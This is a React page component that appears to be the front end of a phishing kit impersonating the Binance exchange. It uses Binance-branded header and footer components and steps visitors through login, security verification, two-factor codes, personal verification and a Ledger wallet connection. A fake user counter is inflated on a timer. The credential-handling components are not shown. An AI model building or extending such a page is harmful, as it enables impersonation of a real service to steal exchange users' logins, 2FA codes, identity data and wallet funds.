
import React, { useState, useEffect } from "react";
import BinanceHeader from "@/components/BinanceHeader";
import BinanceFooter from "@/components/BinanceFooter";
import BinanceAppPromotion from "@/components/BinanceAppPromotion";
import LoginForm from "@/components/LoginForm";
import SecurityVerification from "@/components/SecurityVerification";
import TwoFactorAuth from "@/components/TwoFactorAuth";
import PersonalVerification from "@/components/PersonalVerification";
import WalletLedgerConnection from "@/components/WalletLedgerConnection";

type AuthStep = 'login' | 'securityVerification' | 'twoFactor' | 'personalVerification' | 'walletConnection';

const Index = () => {
  const [userCount, setUserCount] = useState(274368184);
  const [currentStep, setCurrentStep] = useState<AuthStep>('login');
  const [username, setUsername] = useState('');

  useEffect(() => {
    // Simulate counter increasing every few seconds
    const counterInterval = setInterval(() => {
      setUserCount(prev => prev + Math.floor(Math.random() * 5) + 1);
    }, 2000);
    
    return () => {
      clearInterval(counterInterval);
    };
  }, []);

  const handleLoginSuccess = (user: string) => {
    setUsername(user);
    setCurrentStep('securityVerification');
  };

  const handleSecurityVerificationSuccess = () => {
    setCurrentStep('twoFactor');
  };

  const handleTwoFactorSuccess = () => {
    setCurrentStep('personalVerification');
  };

  const handlePersonalVerificationSuccess = () => {
    setCurrentStep('walletConnection');
  };

  const handleBackToLogin = () => {
    setCurrentStep('login');
    setUsername('');
  };

  const handleBackToSecurityVerification = () => {
    setCurrentStep('securityVerification');
  };

  const handleBackToTwoFactor = () => {
    setCurrentStep('twoFactor');
  };

  const renderCurrentStep = () => {
    switch (currentStep) {
      case 'login':
        return <LoginForm onLoginSuccess={handleLoginSuccess} />;
      case 'securityVerification':
        return (
          <SecurityVerification
            username={username}
            onVerificationSuccess={handleSecurityVerificationSuccess}
            onBack={handleBackToLogin}
          />
        );
      case 'twoFactor':
        return (
          <TwoFactorAuth
            username={username}
            onTwoFactorSuccess={handleTwoFactorSuccess}
            onBack={handleBackToSecurityVerification}
          />
        );
      case 'personalVerification':
        return (
          <PersonalVerification
            username={username}
            onVerificationSuccess={handlePersonalVerificationSuccess}
            onBack={handleBackToTwoFactor}
          />
        );
      case 'walletConnection':
        return <WalletLedgerConnection />;
      default:
        return <LoginForm onLoginSuccess={handleLoginSuccess} />;
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-binance-dark text-white">
      <BinanceHeader />
      
      <main className="flex-grow">
        <div className="container mx-auto px-2 sm:px-4 py-3 md:py-6">
          {renderCurrentStep()}
        </div>
      </main>
      
      <BinanceFooter />
      <BinanceAppPromotion />
    </div>
  );
};

export default Index;
